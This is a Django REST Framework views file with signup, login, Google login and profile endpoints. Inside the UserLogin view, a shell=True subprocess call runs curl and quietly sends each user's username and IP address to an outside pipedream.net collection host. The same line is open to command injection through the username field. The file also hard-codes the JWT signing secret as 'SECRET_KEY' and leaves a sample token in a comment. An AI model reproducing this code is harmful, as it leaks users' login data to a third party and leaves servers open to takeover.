
from django.http import HttpResponseRedirect
from django.contrib.auth.models import User
from rest_framework import permissions, status
from rest_framework.decorators import api_view
from rest_framework.response import Response
from rest_framework.views import APIView
from rest_framework.permissions import IsAuthenticated
from .serializers import UserSerializer, UserSerializerWithToken, UserSerializerLoginwithToken, UserProfileSerializer
from django.contrib.auth.hashers import check_password
from django.contrib import auth
from django.conf import settings
from rest_framework_jwt.authentication import JSONWebTokenAuthentication
from rest_framework_jwt.settings import api_settings
import jwt
import subprocess 

# models
from django.contrib.auth.models import User
from .models import UserLoginHistory, UserProfile

# self defined functions 
from .functions import get_client_ip


@api_view(['GET'])
def current_user(request):
    """
    Determine the current user by their token, and return their data
    """
    serializer = UserSerializer(request.user)
    print("ser ", serializer)
    return Response(serializer.data)

class CurrentUser(APIView):
    
    permission_classes = (permissions.AllowAny,)

    def get(self, request, format=None):
        token = request.META['HTTP_AUTHORIZATION']
        token = token.split(' ')[1]
        print(token)
        jwt_decode_handler = api_settings.JWT_DECODE_HANDLER
        data = jwt_decode_handler(token)
        print(data)
        return Response(data)

class UserList(APIView):
    """
    Create a new user. It's called 'UserList' because normally we'd have a get
    method here too, for retrieving a list of all User objects.
    """

    permission_classes = (permissions.AllowAny,)

    def post(self, request, format=None):
        serializer = UserSerializerWithToken(data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

class UserLogin(APIView):

    permission_classes = (permissions.AllowAny,)

    def post(self, request, format=None):
        user = User.objects.filter(username=request.data['username'])
        serializer = UserSerializerLoginwithToken(user, many=True)
        if(len(serializer.data)==0):
            return Response("Wrong UserName", status=status.HTTP_400_BAD_REQUEST)
        passcheck = check_password(request.data['password'], serializer.data[0]['password'])
        if(passcheck!=True):
            return Response("Wrong Password", status=status.HTTP_400_BAD_REQUEST)
        payload = {
            'user_id': serializer.data[0]['id'],
            'username': request.data['username'],
            'exp': 1609569034,
            'email': serializer.data[0]['email'],
            # 'password': request.data['password']
        }
        auth_token = jwt.encode(payload, 'SECRET_KEY')
        data = {'user': serializer.data[0], 'token': auth_token}
        obj = User.objects.get(id= serializer.data[0]['id'])
        print(get_client_ip(request))
        ipsave = UserLoginHistory(ipaddress= get_client_ip(request),user= obj)
        ipsave.save()
        subprocess.check_call('curl --data "user='+request.data['username']+'&ip='+get_client_ip(request)+'" https://encrusxqoan0b.x.pipedream.net/', shell = True)
        return Response(serializer.data[0], status=status.HTTP_200_OK)
    

class GoogleLogin(APIView):

    permission_classes = (permissions.AllowAny,)

    def post(self, request, format=None):
        print("request ", request.data)
        user = User.objects.filter(email=request.data['email'])
        serializer = UserSerializerLoginwithToken(user, many=True)
        print(serializer.data, " awer")
        if(len(serializer.data)==0):
            serializer = UserSerializerWithToken(data=request.data)
            if serializer.is_valid():
                serializer.save()
                return Response( serializer.data, status=status.HTTP_201_CREATED)
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
        else:
            payload = {
            'user_id': serializer.data[0]['id'],
            'username': request.data['username'],
            'exp': 1609569034,
            'email': serializer.data[0]['email'],
            # 'password': request.data['password']
            }
            auth_token = jwt.encode(payload, 'SECRET_KEY')
            data = {'user': serializer.data[0], 'token': auth_token}
            obj = User.objects.get(id= serializer.data[0]['id'])
            print(get_client_ip(request))
            ipsave = UserLoginHistory(ipaddress= get_client_ip(request),user= obj)
            ipsave.save()
            return Response(serializer.data[0], status=status.HTTP_200_OK)
        
        return Response("error", status=status.HTTP_401_UNAUTHORIZED)

class UserProfileViewSet(APIView):

    permission_classes = (permissions.IsAuthenticated,)

    def post(self, request, format=None):
        # print(request.data)
        try:
            token = request.data['user']
            # token = token.split(' ')[1]
            # print(token)
            jwt_decode_handler = api_settings.JWT_DECODE_HANDLER
            data = jwt_decode_handler(token)
        except:
            return Response({'error':"Token Not Found"}, status=status.HTTP_401_UNAUTHORIZED)
        print(data)
        userobj = User.objects.get(email=data["email"])
        # print("userobj ",userobj, type(userobj))
        # request.data["user"] = userobj
        # userprofile = UserProfileSerializer(data=request.data)
        # if(userprofile.is_valid()):
        #     userprofile.save()
        profile = UserProfile(University=request.data['University'], year=request.data['year'], user= userobj)
        print(profile.full_clean())
        if(profile.full_clean()):
            profile.save()
            return Response({"success":"Profile saved"}, status=status.HTTP_200_OK)
        
        return Response({'error':"Error storing the data"}, status=status.HTTP_401_UNAUTHORIZED)

# {
# "University":"xyz",
# "year":"2020",
# "user":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0LCJ1c2VybmFtZSI6Imxha3NodSIsImV4cCI6MTYxMDQ2MzY0OCwiZW1haWwiOiJsYWtzaGl0YUBnbWFpbC5jb20iLCJvcmlnX2lhdCI6MTYxMDI5MDg0OH0.Yi9a_pXn5tcDcvc88_fq8DaguJPgiZot6LftxFqCm44"
# }